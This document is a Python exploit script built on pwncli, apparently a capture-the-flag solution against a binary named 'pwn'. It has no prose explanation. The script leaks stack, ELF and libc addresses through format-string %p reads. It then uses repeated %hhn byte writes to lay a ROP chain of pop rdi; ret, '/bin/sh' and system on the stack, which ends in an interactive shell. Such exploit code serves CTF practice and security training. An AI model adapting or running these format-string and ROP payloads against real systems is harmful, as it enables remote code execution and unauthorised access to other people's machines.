#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

current_n = 0
def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"

ru(b"What's your name?\n");
current_n = 0
payload = b"%4$p.%41$p.%43$p."
sl(payload)
stack_buf = int(ru(b".", drop=True), 16)
elf_base  = int(ru(b".", drop=True), 16) - 0x1307
libc_base = int(ru(b".", drop=True), 16) - 0x24083
lg("stack_buf")
lg("elf_base")
lg("libc_base")
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)

pop_rdi_ret = libc_base + 0x0000000000023b6a
ret_addr    = pop_rdi_ret + 1
bin_sh_str  = libc_base + next(libc.search(b"/bin/sh\x00"))
system_addr = libc_base + libc.sym.system

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0,  ( (pop_rdi_ret) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (pop_rdi_ret >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (pop_rdi_ret >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (pop_rdi_ret >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (pop_rdi_ret >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (pop_rdi_ret >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 8 + 0x118)
payload += p64(stack_buf + 8 + 0x119)
payload += p64(stack_buf + 8 + 0x11a)
payload += p64(stack_buf + 8 + 0x11b)
payload += p64(stack_buf + 8 + 0x11c)
payload += p64(stack_buf + 8 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((bin_sh_str) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (bin_sh_str >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (bin_sh_str >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (bin_sh_str >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (bin_sh_str >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (bin_sh_str >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 16 + 0x118)
payload += p64(stack_buf + 16 + 0x119)
payload += p64(stack_buf + 16 + 0x11a)
payload += p64(stack_buf + 16 + 0x11b)
payload += p64(stack_buf + 16 + 0x11c)
payload += p64(stack_buf + 16 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((system_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (system_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (system_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (system_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (system_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (system_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 24 + 0x118)
payload += p64(stack_buf + 24 + 0x119)
payload += p64(stack_buf + 24 + 0x11a)
payload += p64(stack_buf + 24 + 0x11b)
payload += p64(stack_buf + 24 + 0x11c)
payload += p64(stack_buf + 24 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((ret_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (ret_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (ret_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (ret_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (ret_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (ret_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0 + 0x118)
payload += p64(stack_buf + 0 + 0x119)
payload += p64(stack_buf + 0 + 0x11a)
payload += p64(stack_buf + 0 + 0x11b)
payload += p64(stack_buf + 0 + 0x11c)
payload += p64(stack_buf + 0 + 0x11d)
sl(payload)

ia()
